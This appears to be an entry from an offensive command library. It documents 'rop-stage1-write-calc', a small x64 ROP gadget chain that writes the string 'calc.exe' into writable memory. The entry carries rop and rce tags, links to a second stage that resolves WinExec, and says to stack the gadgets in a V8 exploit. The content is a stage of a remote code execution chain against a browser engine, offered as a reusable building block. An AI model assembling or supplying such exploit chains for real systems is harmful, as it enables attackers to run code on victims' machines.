---
data: >-
  pop rcx ; Load \"calc.exe\" part into rcx\nret;\npop rax ; Load writable
  address into rax >0x9519000\nret;\nmov [rax], rcx ; Write \"calc\" to writable
  section
tags:
  - rop
  - rce
type: command
output: Memory written with command string.
executor: asm
platforms:
  - Windows
id: 47ddffd1-7bf6-41ed-a866-1a5cf35792c3
created_at: '2025-12-13T23:55:06.755Z'
updated_at: '2025-12-13T23:55:06.755Z'
verified: false
validated: true
submitted: true
---
# rop-stage1-write-calc

## Command

```asm
pop rcx ; Load "calc.exe" part into rcx
ret;
pop rax ; Load writable address into rax >0x9519000
ret;
mov [rax], rcx ; Write "calc" to writable section
```

## Description

ROP gadget chain to write 'calc.exe' string to writable memory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rax | Writable memory address (>0x9519000) | Yes |
| rcx | Holds 'calc.exe' string | Yes |

## Examples

### Basic Usage

Stack the gadgets in V8 exploit.

## Expected Output

String written to [rax].

## Related

- [[commands/rop-stage2-resolve-winexec]]
